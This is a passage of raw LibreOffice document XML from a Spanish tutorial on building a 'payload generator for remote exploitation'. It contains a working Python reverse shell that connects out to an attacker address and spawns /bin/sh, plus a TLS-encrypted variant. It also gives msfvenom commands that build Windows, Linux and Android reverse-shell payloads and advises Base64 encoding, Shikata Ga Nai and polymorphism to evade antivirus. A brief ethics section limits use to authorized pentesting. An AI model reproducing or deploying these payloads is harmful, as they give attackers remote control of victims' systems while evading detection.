      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import socket</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import os</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import subprocess</text:span></text:span></text:p>
      <text:p text:style-name="P137"/>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">def create_reverse_shell(lhost, lport):</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/># Crear un socket</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>s.connect((lhost, lport))</text:span></text:span></text:p>
      <text:p text:style-name="P137"/>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/># Redirigir el stdin, stdout y stderr del proceso a través del socket</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(s.fileno(), 0) <text:s/># Redirigir stdin</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(s.fileno(), 1) <text:s/># Redirigir stdout</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(s.fileno(), 2) <text:s/># Redirigir stderr</text:span></text:span></text:p>
      <text:p text:style-name="P137"/>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/># Ejecutar una shell</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>subprocess.call(["/bin/sh", "-i"])</text:span></text:span></text:p>
      <text:p text:style-name="P137"/>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">if __name__ == "__main__":</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>LHOST = "192.168.1.100" <text:s/># Dirección IP de la máquina atacante</text:span></text:span></text:p>
      <text:p text:style-name="P145"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>LPORT = 4444 <text:s text:c="12"/># Puerto a usar para la conexión inversa</text:span></text:span></text:p>
      <text:p text:style-name="P157"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>create_reverse_shell(LHOST, LPORT)</text:span></text:span></text:p>
      <text:p text:style-name="P81"><text:span text:style-name="T2">En este ejemplo, el payload de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">reverse shell</text:span></text:span><text:span text:style-name="T2"> se conecta a la máquina atacante (a través de </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">LHOST</text:span></text:span><text:span text:style-name="T2"> y </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">LPORT</text:span></text:span><text:span text:style-name="T2">) y ejecuta una shell interactiva en la máquina víctima, permitiendo a la máquina atacante ejecutar comandos en la máquina víctima.</text:span></text:p>
      <text:p text:style-name="P81"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Personalización</text:span></text:span><text:span text:style-name="T2">: Este script puede ser modificado para generar archivos ejecutables en diferentes plataformas utilizando </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">PyInstaller</text:span></text:span><text:span text:style-name="T2"> o </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Cx_Freeze</text:span></text:span><text:span text:style-name="T2"> para compilar el código Python en un archivo ejecutable independiente.</text:span></text:p>
      <text:p text:style-name="P157"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">pyinstaller --onefile --clean reverse_shell.py</text:span></text:span></text:p>
      <text:p text:style-name="P130"/>
      <text:h text:style-name="P128" text:outline-level="4"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">4. Opciones Avanzadas de Personalización del Payload</text:span></text:span></text:h>
      <text:list xml:id="list792104442" text:style-name="L66">
        <text:list-item>
          <text:p text:style-name="P78"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Codificación de Payloads</text:span></text:span><text:span text:style-name="T2">: Para evitar la detección por parte de los antivirus, los payloads generados deben ser codificados. Esto se puede hacer utilizando técnicas de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">codificación Base64</text:span></text:span><text:span text:style-name="T2"> o con herramientas como </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Shikata Ga Nai</text:span></text:span><text:span text:style-name="T2"> (en Metasploit).</text:span></text:p>
          <text:p text:style-name="P78"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ejemplo de Codificación en Python</text:span></text:span><text:span text:style-name="T2">:</text:span></text:p>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import base64</text:span></text:span></text:p>
          <text:p text:style-name="P138"/>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">def encode_payload(payload):</text:span></text:span></text:p>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>encoded = base64.b64encode(payload.encode('utf-8'))</text:span></text:span></text:p>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>return encoded.decode('utf-8')</text:span></text:span></text:p>
          <text:p text:style-name="P138"/>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">payload = "reverse shell payload"</text:span></text:span></text:p>
          <text:p text:style-name="P143"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">encoded_payload = encode_payload(payload)</text:span></text:span></text:p>
          <text:p text:style-name="P155"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">print(f"Encoded Payload: {encoded_payload}")</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P78"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Generación de Payloads para Diferentes Plataformas</text:span></text:span><text:span text:style-name="T2">: El generador debe ser capaz de crear payloads que funcionen en diferentes sistemas operativos. Esto se puede lograr con el uso de diferentes scripts o herramientas especializadas para cada plataforma.</text:span></text:p>
          <text:p text:style-name="P78"><text:span text:style-name="T2">Por ejemplo, para generar un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">payload Windows</text:span></text:span><text:span text:style-name="T2"> con Metasploit:</text:span></text:p>
          <text:p text:style-name="P155"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe &gt; payload.exe</text:span></text:span></text:p>
          <text:p text:style-name="P78"><text:span text:style-name="T2">O para </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Linux</text:span></text:span><text:span text:style-name="T2">:</text:span></text:p>
          <text:p text:style-name="P155"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf &gt; payload.elf</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P78"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Compilación del Payload para Android</text:span></text:span><text:span text:style-name="T2">: Para generar un payload para Android, puedes usar </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">msfvenom</text:span></text:span><text:span text:style-name="T2"> o crear un archivo APK que contenga el reverse shell.</text:span></text:p>
          <text:p text:style-name="P155"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P130"/>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">5. Mejoras y Opciones Avanzadas</text:span></text:span></text:h>
      <text:list xml:id="list974303261" text:style-name="L67">
        <text:list-item>
          <text:p text:style-name="P79"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Opciones de Polimorfismo</text:span></text:span><text:span text:style-name="T2">: El generador puede incorporar técnicas de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">polimorfismo</text:span></text:span><text:span text:style-name="T2">, que modifican el código del payload de manera dinámica cada vez que se genera un nuevo archivo. De esta manera, se hace más difícil para los antivirus detectar patrones comunes.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Manejo de Conexiones Seguras</text:span></text:span><text:span text:style-name="T2">: El generador puede incorporar </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">encriptación SSL/TLS</text:span></text:span><text:span text:style-name="T2"> para asegurar la conexión entre el atacante y la víctima, haciendo más difícil que los IDS/IPS o los sistemas de seguridad intermedios detecten la comunicación.</text:span></text:p>
          <text:p text:style-name="P79"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ejemplo con OpenSSL en Python</text:span></text:span><text:span text:style-name="T2">:</text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import ssl</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import socket</text:span></text:span></text:p>
          <text:p text:style-name="P139"/>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">def create_secure_reverse_shell(lhost, lport):</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>secure_socket = context.wrap_socket(s, server_hostname=lhost)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>secure_socket.connect((lhost, lport))</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/># Redirigir stdin, stdout, stderr como antes</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(secure_socket.fileno(), 0)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(secure_socket.fileno(), 1)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>os.dup2(secure_socket.fileno(), 2)</text:span></text:span></text:p>
          <text:p text:style-name="P144"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="4"/>subprocess.call(["/bin/sh", "-i"])</text:span></text:span></text:p>
          <text:p text:style-name="P139"/>
          <text:p text:style-name="P156"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">create_secure_reverse_shell("192.168.1.100", 4444)</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P130"/>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">6. Pruebas y Evaluación del Generador</text:span></text:span></text:h>
      <text:list xml:id="list506239001" text:style-name="L68">
        <text:list-item>
          <text:p text:style-name="P80"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Pruebas de Detección por Antivirus</text:span></text:span><text:span text:style-name="T2">: Después de generar el payload, prueba la herramienta contra varios antivirus para comprobar si es detectado. Utiliza servicios como </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">VirusTotal</text:span></text:span><text:span text:style-name="T2"> o instala antivirus en tu entorno de pruebas.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P80"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Pruebas de Conectividad</text:span></text:span><text:span text:style-name="T2">: Realiza pruebas para asegurar que los payloads generados establecen la conexión correctamente entre la máquina víctima y la máquina atacante.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P130"/>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">7. Consideraciones Éticas y Legales</text:span></text:span></text:h>
      <text:p text:style-name="P81"><text:span text:style-name="T2">Este proyecto debe ser realizado en un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">entorno controlado</text:span></text:span><text:span text:style-name="T2"> y </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">seguro</text:span></text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Nunca debes</text:span></text:span><text:span text:style-name="T2"> utilizar esta herramienta sin permiso explícito del propietario del sistema que estás probando. La creación y el uso de payloads para explotación remota sin autorización es </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">ilegal</text:span></text:span><text:span text:style-name="T2"> y está penado por la ley en muchas jurisdicciones.</text:span></text:p>
      <text:p text:style-name="P81"><text:span text:style-name="T2">Este proyecto está destinado a </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">pruebas de penetración</text:span></text:span><text:span text:style-name="T2"> y </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">evaluaciones de seguridad</text:span></text:span><text:span text:style-name="T2"> en entornos controlados y con el </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">consentimiento explícito</text:span></text:span><text:span text:style-name="T2"> del propietario de los sistemas que están siendo evaluados.</text:span></text:p>
      <text:p text:style-name="P130"><text:soft-page-break/></text:p>
      <text:h text:style-name="P133" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Conclusión:</text:span></text:span></text:h>
      <text:p text:style-name="P81"><text:span text:style-name="T2">El </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Generador de Payloads para Explotación Remota</text:span></text:span><text:span text:style-name="T2"> es una herramienta esencial para las pruebas de penetración y la evaluación de la seguridad. A través de la generación de payloads personalizables y su implementación en diversas plataformas, este proyecto permite a los profesionales de seguridad mejorar sus habilidades en la </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">explotación remota</text:span></text:span><text:span text:style-name="T2"> y </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">evadir mecanismos de detección</text:span></text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P9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2:28:04.746000000</meta:creation-date>
    <dc:date>2025-01-06T02:59:22.291000000</dc:date>
    <meta:editing-duration>PT26M14S</meta:editing-duration>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:generator>Trio_Office/6.2.8.2$Windows_x86 LibreOffice_project/</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="91" meta:word-count="1033" meta:character-count="7280" meta:non-whitespace-character-count="6270"/>
  </office:meta>
</office:document-meta>
</file>